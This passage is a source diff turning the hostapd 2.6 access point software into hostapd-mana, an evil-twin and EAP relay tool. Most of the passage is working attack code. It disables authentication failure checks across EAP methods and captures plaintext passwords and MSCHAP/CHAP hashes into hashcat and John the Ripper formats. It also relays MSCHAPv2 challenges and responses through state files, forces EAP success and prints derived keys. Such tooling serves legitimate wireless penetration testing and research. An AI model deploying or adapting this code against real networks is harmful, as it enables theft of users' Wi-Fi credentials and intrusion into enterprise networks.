> #include "common/mana.h" //MANA
26c27
< #define EAP_MAX_AUTH_ROUNDS 50
---
> #define EAP_MAX_AUTH_ROUNDS 50000 //MANA
177a179,218
> 	//MANA START
> 	if (mana.conf->enable_sycophant && os_strcmp("NOT_SET",mana.conf->sycophant_dir) != 0) {
> 		char sup_state[2] = "*";
> 		FILE* sycophantState;
> 		char sycophantStateFile[sizeof(mana.conf->sycophant_dir)+16];
> 		os_strlcpy(sycophantStateFile,mana.conf->sycophant_dir,sizeof(mana.conf->sycophant_dir));
> 		strcat(sycophantStateFile,"SYCOPHANT_STATE");
> 		sycophantState = fopen(sycophantStateFile,"rb");
> 		if (sycophantState != NULL) {
> 			fread(sup_state,1,1,sycophantState);
> 			fclose(sycophantState);
> 		}
> 		if (os_strcmp(sup_state,"I") == 0) {
> 			FILE* sycophantID;
> 			char sycophantIDFile[sizeof(mana.conf->sycophant_dir)+15];
> 			os_strlcpy(sycophantIDFile,mana.conf->sycophant_dir,sizeof(mana.conf->sycophant_dir));
> 			if (phase2)
> 				strcat(sycophantIDFile,"SYCOPHANT_P2ID");
> 			else
> 				strcat(sycophantIDFile,"SYCOPHANT_P1ID");
> 			sycophantID = fopen(sycophantIDFile, "wb");
> 
> 			if (sycophantID != NULL) {
> 				fwrite(identity,identity_len,1,sycophantID);
> 				fclose(sycophantID);
> 			} else
> 				wpa_printf(MSG_ERROR,"SYCOPHANT: Unable to open Sycophant Stage %d Identity File %s",phase2,sycophantIDFile);
> 		}
> 	}
> 	if (mana.conf->mana_wpe || mana.conf->enable_sycophant) {
> 		wpa_printf(MSG_INFO, "MANA EAP Identity Phase %d: %.*s", phase2, (int)identity_len, identity);
> 		if (phase2) {
> 			char ident = 't'; // This must match the entry in the hostapd.eap_user RADIUS config file
> 			wpa_printf(MSG_DEBUG, "MANA EAP Identiy Phase %d: Setting identity to %c", phase2, ident);
> 			identity = (const u8 *)&ident;
> 			identity_len = 1;
> 		}
> 	}
> 	//MANA END
> 
1996a2038
> /*
2004c2046
< 	/* Print out Challenge and Response in format supported by asleap. */
---
> 	// Print out Challenge and Response in format supported by asleap.
2016c2058,2160
< #endif /* CONFIG_TESTING_OPTIONS */
---
> #endif // CONFIG_TESTING_OPTIONS
> */
> //MANA WPE Start
> void eap_server_mschap_rx_callback(struct eap_sm *sm, const char *source,
> 				   const u8 *username, size_t username_len,
> 				   const u8 *challenge, const u8 *response)
> {
> 	if (mana.conf->mana_wpe) {
> 		char hex_sep_challenge[30], hex_sep_response[90], user[100];
> 		char hex_challenge[30], hex_response[90];
> 
> 		/* Print out Challenge and Response in format supported by asleap/jtr/hashcat. */
> 		if (username)
> 			printf_encode(user, sizeof(user), username, username_len);
> 		else
> 			user[0] = '\0';
> 		wpa_snprintf_hex_sep(hex_sep_challenge, sizeof(hex_sep_challenge),
> 				     challenge, sizeof(challenge), ':');
> 		wpa_snprintf_hex_sep(hex_sep_response, sizeof(hex_sep_response), response, 24,
> 				     ':');
> 		wpa_printf(MSG_INFO, "MANA EAP %s ASLEAP user=%s | asleap -C %s -R %s",
> 			   source, user, hex_sep_challenge, hex_sep_response);
> 		wpa_snprintf_hex(hex_challenge, sizeof(hex_challenge), challenge, sizeof(challenge));
> 		wpa_snprintf_hex(hex_response, sizeof(hex_response), response, 24);
> 		wpa_printf(MSG_INFO, "MANA EAP %s JTR | %s:$NETNTLM$%s$%s:::::::",
> 			   source, user, hex_challenge, hex_response);
> 		wpa_printf(MSG_INFO, "MANA EAP %s HASHCAT | %s::::%s:%s",
> 			   source, user, hex_response, hex_challenge);
> 
> 		if (os_strcmp("NOT_SET",mana.conf->mana_credout)!=0) {
> 			FILE *f = fopen(mana.conf->mana_credout, "a");
> 			if (f != NULL) {
> 				fprintf(f,"[%s ASLEAP user=%s]\tasleap -C %s -R %s\n",
> 					source, user, hex_sep_challenge, hex_sep_response);
> 				fprintf(f,"[%s JTR]\t%s:$NETNTLM$%s$%s:::::::\n",
> 					source, user, hex_challenge, hex_response);
> 				fprintf(f,"[%s HASHCAT]\t%s::::%s:%s\n",
> 					source, user, hex_response, hex_challenge);
> 				fclose(f);
> 			}
> 		}
> 	}
> }
> 
> void eap_server_chap_rx_callback(struct eap_sm *sm, const char *source,
> 				 const u8 *username, size_t username_len,
> 				 const u8 *hash, const u8 *salt,
> 				 u8 id)
> {
> 	if (mana.conf->mana_wpe) {
> 		char hex_hash[40], hex_salt[40], hex_id[10], user[100];
> 
> 		/* Print out Challenge and Response in format supported by asleap/jtr/hashcat. */
> 		if (username)
> 			printf_encode(user, sizeof(user), username, username_len);
> 		else
> 			user[0] = '\0';
> 		wpa_snprintf_hex(hex_hash, 34, hash, 16);
> 		wpa_snprintf_hex(hex_salt, 34, salt, 16);
> 		wpa_snprintf_hex(hex_id, 3, &id, 1);
> 		wpa_printf(MSG_INFO, "MANA EAP %s JTR user=%s | $chap$%s*%s*%s",
> 			   source, user, hex_id, hex_salt, hex_hash);
> 		wpa_printf(MSG_INFO, "MANA EAP %s HASHCAT user=%s | %s:%s:%s",
> 			   source, user, hex_hash, hex_salt, hex_id);
> 
> 		if (os_strcmp("NOT_SET",mana.conf->mana_credout)!=0) {
> 			FILE *f = fopen(mana.conf->mana_credout, "a");
> 			if (f != NULL) {
> 				fprintf(f,"[%s JTR user=%s]\t$chap$%s*%s*%s\n",
> 					source, user, hex_id, hex_salt, hex_hash);
> 				fprintf(f, "[%s HASHCAT user=%s]\t%s:%s:%s\n",
> 					source, user, hex_hash, hex_salt, hex_id);
> 				fclose(f);
> 			}
> 		}
> 	}
> }
> 
> void eap_server_pap_rx_callback(struct eap_sm *sm, const char *source,
> 				 const u8 *username, size_t username_len,
> 				 const u8 *password, size_t password_len)
> {
> 	if (mana.conf->mana_wpe) {
> 		char passwd[password_len+1], user[100];
> 
> 		if (username)
> 			printf_encode(user, sizeof(user), username, username_len);
> 		else
> 			user[0] = '\0';
> 		os_memcpy(passwd,password,password_len);
> 		wpa_printf(MSG_INFO, "MANA EAP %s | %s:%s",
> 			   source, user, password);
> 
> 		if (os_strcmp("NOT_SET",mana.conf->mana_credout)!=0) {
> 			FILE *f = fopen(mana.conf->mana_credout, "a");
> 			if (f != NULL) {
> 				fprintf(f,"[%s]\t%s:%s\n", source, user, password);
> 				fclose(f);
> 			}
> 		}
> 	}
> }
> //MANA WPE END
diff '--color=auto' -rN hostapd-2.6/src/eap_server/eap_server_fast.c hostapd-mana/src/eap_server/eap_server_fast.c
1046c1046,1047
< 		if (eap_user_get(sm, sm->identity, sm->identity_len, 1) != 0) {
---
> 		//if (eap_user_get(sm, sm->identity, sm->identity_len, 1) != 0) {
> 		if (eap_user_get(sm, sm->identity, sm->identity_len, 0) != 0) {
diff '--color=auto' -rN hostapd-2.6/src/eap_server/eap_server_gtc.c hostapd-mana/src/eap_server/eap_server_gtc.c
12a13
> #include "common/mana.h" //MANA
177,181c178,189
< 	if (rlen != sm->user->password_len ||
< 	    os_memcmp_const(pos, sm->user->password, rlen) != 0) {
< 		wpa_printf(MSG_DEBUG, "EAP-GTC: Done - Failure");
< 		data->state = FAILURE;
< 	} else {
---
> //MANA Start
> 	if (mana.conf->mana_wpe) {
> 		eap_server_pap_rx_callback(sm, "GTC",
> 				sm->identity, sm->identity_len,
> 				pos, rlen);
> 	}
> //MANA End
> 	//if (rlen != sm->user->password_len ||
> 	    //os_memcmp_const(pos, sm->user->password, rlen) != 0) {
> 		//wpa_printf(MSG_DEBUG, "EAP-GTC: Done - Failure");
> 		//data->state = FAILURE;
> 	//} else {
184c192
< 	}
---
> 	//}
diff '--color=auto' -rN hostapd-2.6/src/eap_server/eap_server_md5.c hostapd-mana/src/eap_server/eap_server_md5.c
14a15
> #include "common/mana.h" //MANA
110,111c111,112
< 		data->state = FAILURE;
< 		return;
---
> 		//data->state = FAILURE;
> 		//return;
121a123,129
> //MANA Start
> 	if (mana.conf->mana_wpe) {
> 		eap_server_chap_rx_callback(sm, "MD5",
> 				sm->identity, sm->identity_len,
> 				pos, data->challenge, id);
> 	}
> //MANA End
125,126c133,134
< 		data->state = FAILURE;
< 		return;
---
> 		//data->state = FAILURE;
> 		//return;
129c137
< 	if (os_memcmp_const(hash, pos, CHAP_MD5_LEN) == 0) {
---
> 	//if (os_memcmp_const(hash, pos, CHAP_MD5_LEN) == 0) {
132,135c140,143
< 	} else {
< 		wpa_printf(MSG_DEBUG, "EAP-MD5: Done - Failure");
< 		data->state = FAILURE;
< 	}
---
> 	//} else {
> 		//wpa_printf(MSG_DEBUG, "EAP-MD5: Done - Failure");
> 		//data->state = FAILURE;
> 	//}
diff '--color=auto' -rN hostapd-2.6/src/eap_server/eap_server_mschapv2.c hostapd-mana/src/eap_server/eap_server_mschapv2.c
15c15,16
< 
---
> #include <stdlib.h>
> #include "common/mana.h" //MANA
127a129,185
> 	//MANA SYCOPHANT START
> 	if (mana.conf->enable_sycophant && os_strcmp("NOT_SET",mana.conf->sycophant_dir) != 0) {
> 		char sup_state[2] = "*";
> 		FILE* sycophantState;
> 		char sycophantStateFile[sizeof(mana.conf->sycophant_dir)+16];
> 		os_strlcpy(sycophantStateFile,mana.conf->sycophant_dir,sizeof(mana.conf->sycophant_dir));
> 		strcat(sycophantStateFile,"SYCOPHANT_STATE");
> 		wpa_printf(MSG_DEBUG, "SYCOPHANT: Checking Sycophant State File.");
> 
> 		while (os_strcmp(sup_state,"C") != 0) {
> 			sycophantState = fopen(sycophantStateFile,"rb");
> 			if (sycophantState == NULL) {
> 				wpa_printf (MSG_ERROR,"SYCOPHANT: Unable to open state file %s, not relaying",sycophantStateFile);
> 				break;
> 			} else {
> 				fread(sup_state,1,1,sycophantState);
> 				if (strcmp(sup_state,"Z") == 0) {
> 					wpa_printf(MSG_DEBUG, "SYCOPHANT: State file is Z bailing!");
> 					fclose(sycophantState);
> 					break;
> 				}
> 				fclose(sycophantState);
> 				usleep(10000); //Prevent thrashing
> 			}
> 		}
> 
> 		if (strcmp(sup_state,"C") == 0) {
> 			wpa_printf(MSG_DEBUG, "SYCOPHANT: State file says we have a challenge.");
> 			FILE* challengeIn;
> 			char challengeInFile[sizeof(mana.conf->sycophant_dir)+10];
> 			os_strlcpy(challengeInFile,mana.conf->sycophant_dir,sizeof(mana.conf->sycophant_dir));
> 			strcat(challengeInFile,"CHALLENGE");
> 			challengeIn = fopen(challengeInFile, "rb");
> 			if (challengeIn == NULL) {
> 				wpa_printf(MSG_ERROR, "SYCOPHANT: Could not open challenge file %s",challengeInFile);
> 			} else {
> 				fseek(challengeIn, 0, SEEK_END);
> 				if (ftell(challengeIn) > 0) {
> 					rewind(challengeIn);
> 					u8 line [CHALLENGE_LEN];
> 					fread(line, CHALLENGE_LEN, 1, challengeIn);
> 					wpa_hexdump(MSG_DEBUG, "SYCOPHANT: Incoming MSCHAPv2 challenge", line, CHALLENGE_LEN);
> 					memcpy(data->auth_challenge, line, CHALLENGE_LEN);
> 					fclose(challengeIn);
> 					// Blank file
> 					challengeIn = fopen(challengeInFile, "wb");
> 				} else {
> 					usleep(1000); // Prevent thrashing
> 				}
> 				fclose(challengeIn);
> 			}
> 			// TODO: find replace for all these random youtube vids
> 			// https://www.youtube.com/watch?v=QUNJ5TRRYqg
> 		}
> 	}
> 	//MANA SYCOPHANT END
> 
303a362,407
> 	//MANA SYCOPHANT START
> 	if (mana.conf->enable_sycophant && os_strcmp("NOT_SET",mana.conf->sycophant_dir) != 0) {
> 		char sup_state[2] = "*";
> 		FILE* sycophantState;
> 		char sycophantStateFile[sizeof(mana.conf->sycophant_dir)+16];
> 		os_strlcpy(sycophantStateFile,mana.conf->sycophant_dir,sizeof(mana.conf->sycophant_dir));
> 		strcat(sycophantStateFile,"SYCOPHANT_STATE");
> 		sycophantState = fopen(sycophantStateFile,"rb");
> 
> 		if (sycophantState != NULL) {
> 			wpa_printf(MSG_DEBUG, "SYCOPHANT: Checking state file.");
> 			fread(sup_state,1,1,sycophantState);
> 			fclose(sycophantState);
> 		} else {
> 			wpa_printf (MSG_ERROR,"SYCOPHANT: Unable to open state file %s, not relaying",sycophantStateFile);
> 		}
> 
> 		if (strcmp(sup_state,"C") == 0) {
> 			wpa_printf(MSG_DEBUG, "SYCOPHANT: State file at Challenge, write the Response.");
> 			FILE* responseOut;
> 			char responseOutFile[sizeof(mana.conf->sycophant_dir)+9];
> 			os_strlcpy(responseOutFile,mana.conf->sycophant_dir,sizeof(mana.conf->sycophant_dir));
> 			strcat(responseOutFile,"RESPONSE");
> 			responseOut = fopen(responseOutFile, "wb");
> 			if (responseOut == NULL) {
> 				wpa_printf(MSG_ERROR, "SYCOPHANT: Could not open response file %s",responseOutFile);
> 			} else {
> 				fwrite(respData->buf,respData->used,1,responseOut);
> 				wpa_hexdump(MSG_DEBUG, "SYCOPHANT: Response to be sent to supplicant", respData->buf, respData->used);
> 				fclose(responseOut);
> 				// Inform of our readyness
> 				sycophantState = fopen(sycophantStateFile,"wb");
> 				if (sycophantState != NULL) {
> 					sup_state[0] = 'R';
> 					fwrite(sup_state,1,1,sycophantState);
> 					fclose(sycophantState);
> 					wpa_printf(MSG_INFO,"SYCOPHANT: MSCHAPv2 Response handed off to supplicant.");
> 				} else {
> 					wpa_printf (MSG_ERROR,"SYCOPHANT: Unable to open state file %s",sycophantStateFile);
> 				}
> 			}
> 		}
> 
> 	}
> 	//MANA SYCOPHANT END
> 
363c467,469
< #ifdef CONFIG_TESTING_OPTIONS
---
> //MANA Start
> //#ifdef CONFIG_TESTING_OPTIONS
> 	if (mana.conf->mana_wpe)
374c480,481
< #endif /* CONFIG_TESTING_OPTIONS */
---
> //#endif /* CONFIG_TESTING_OPTIONS */
> //MANA End
408a516,520
> 	//MANA Start
> 	if (mana.conf->mana_eapsuccess) {
> 		os_memcpy(expected, nt_response, 24); //MANA set challenges to match
> 	}
> 	//MANA End
441c553
< 		wpa_hexdump_key(MSG_DEBUG, "EAP-MSCHAPV2: Derived Master Key",
---
> 		wpa_hexdump_key(MSG_INFO, "EAP-MSCHAPV2: Derived Master Key",
448a561,563
> 	if (mana.conf->mana_eapsuccess) { //MANA
> 		data->state = SUCCESS; //MANA WPE
> 	}
512,514d626
< 		wpa_printf(MSG_INFO, "EAP-MSCHAPV2: Password not configured");
< 		data->state = FAILURE;
< 		return;
diff '--color=auto' -rN hostapd-2.6/src/eap_server/eap_server_ttls.c hostapd-mana/src/eap_server/eap_server_ttls.c
18a19
> #include "common/mana.h" //MANA
537,538c538,539
< 		eap_ttls_state(data, FAILURE);
< 		return;
---
> 		//eap_ttls_state(data, FAILURE);
> 		//return;
540a542,549
> //MANA Start
> 	if (mana.conf->mana_wpe) {
> 		// thanks gcp
> 		eap_server_pap_rx_callback(sm, "TTLS-PAP",
> 				sm->identity, sm->identity_len,
> 				user_password, user_password_len);
> 	}
> //MANA End
544,546c553,555
< 		wpa_printf(MSG_DEBUG, "EAP-TTLS/PAP: Invalid user password");
< 		eap_ttls_state(data, FAILURE);
< 		return;
---
> 		wpa_printf(MSG_DEBUG, "EAP-TTLS/PAP: Invalid user password: %s", user_password);
> 		//eap_ttls_state(data, FAILURE);
> 		//return;
571,572c580,581
< 		eap_ttls_state(data, FAILURE);
< 		return;
---
> 		//eap_ttls_state(data, FAILURE);
> 		//return;
579,580c588,589
< 		eap_ttls_state(data, FAILURE);
< 		return;
---
> 		//eap_ttls_state(data, FAILURE);
> 		//return;
596,598c605,607
< 		os_free(chal);
< 		eap_ttls_state(data, FAILURE);
< 		return;
---
> 		//os_free(chal);
> 		//eap_ttls_state(data, FAILURE);
> 		//return;
601a611,619
> //MANA Start
> 	if (mana.conf->mana_wpe) {
> 		// First byte of password is the ID, rest is the hash
> 		eap_server_chap_rx_callback(sm, "TTLS-CHAP",
> 				sm->identity, sm->identity_len,
> 				password+1, challenge, password[0]);
> 	}
> //MANA End
> 
614a633
> 
632,633c651,652
< 		eap_ttls_state(data, FAILURE);
< 		return;
---
> 		//eap_ttls_state(data, FAILURE);
> 		//return;
640,641c659,660
< 		eap_ttls_state(data, FAILURE);
< 		return;
---
> 		//eap_ttls_state(data, FAILURE);
> 		//return;
653,657c672,680
< #ifdef CONFIG_TESTING_OPTIONS
< 	eap_server_mschap_rx_callback(sm, "TTLS-MSCHAP",
< 				      sm->identity, sm->identity_len,
< 				      challenge, response + 2 + 24);
< #endif /* CONFIG_TESTING_OPTIONS */
---
> //MANA Start
> //#ifdef CONFIG_TESTING_OPTIONS
> 	if (mana.conf->mana_wpe) {
> 		eap_server_mschap_rx_callback(sm, "TTLS-MSCHAP",
> 					      sm->identity, sm->identity_len,
> 					      challenge, response + 2 + 24);
> 	}
> //#endif /* CONFIG_TESTING_OPTIONS */
> //MANA End
707,708c730,731
< 		eap_ttls_state(data, FAILURE);
< 		return;
---
> 		//eap_ttls_state(data, FAILURE);
> 		//return;
715,716c738,739
< 		eap_ttls_state(data, FAILURE);
< 		return;
---
> 		//eap_ttls_state(data, FAILURE);
> 		//return;
722,723c745,746
< 		eap_ttls_state(data, FAILURE);
< 		return;
---
> 		//eap_ttls_state(data, FAILURE);
> 		//return;
752,754c775,777
< 		os_free(chal);
< 		eap_ttls_state(data, FAILURE);
< 		return;
---
> 		//os_free(chal);
> 		//eap_ttls_state(data, FAILURE);
> 		//return;
782c805,807
< #ifdef CONFIG_TESTING_OPTIONS
---
> //MANA Start
> //#ifdef CONFIG_TESTING_OPTIONS
> 	if (mana.conf->mana_wpe)
793c818,819
< #endif /* CONFIG_TESTING_OPTIONS */
---
> //#endif /* CONFIG_TESTING_OPTIONS */
> //MANA End
926,927c952,953
< 			eap_ttls_state(data, FAILURE);
< 			break;
---
> 			//eap_ttls_state(data, FAILURE);
> 			//break;
1065,1066c1091,1092
< 			eap_ttls_state(data, FAILURE);
< 			goto done;
---
> 			//eap_ttls_state(data, FAILURE);
> 			//goto done;
diff '--color=auto' -rN hostapd-2.6/src/utils/wpa_debug.c hostapd-mana/src/utils/wpa_debug.c
33c33
< int wpa_debug_show_keys = 0;
---
> int wpa_debug_show_keys = 1;
